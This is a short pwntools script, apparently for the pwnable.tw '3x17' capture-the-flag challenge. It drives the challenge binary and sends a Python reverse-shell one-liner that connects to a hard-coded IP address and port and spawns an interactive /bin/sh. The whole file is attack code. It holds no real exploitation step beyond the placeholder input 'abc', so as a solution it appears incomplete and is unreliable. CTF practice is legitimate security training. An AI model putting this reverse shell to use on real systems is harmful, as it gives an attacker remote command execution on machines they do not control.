#!/usr/bin/env python3.7

from pwn import *

r = process('./3x17')
#r = remote('chall.pwnable.tw', 10105)
r.sendline('abc')
r.sendline('python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"140.116.245.243\",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'')

r.interactive()
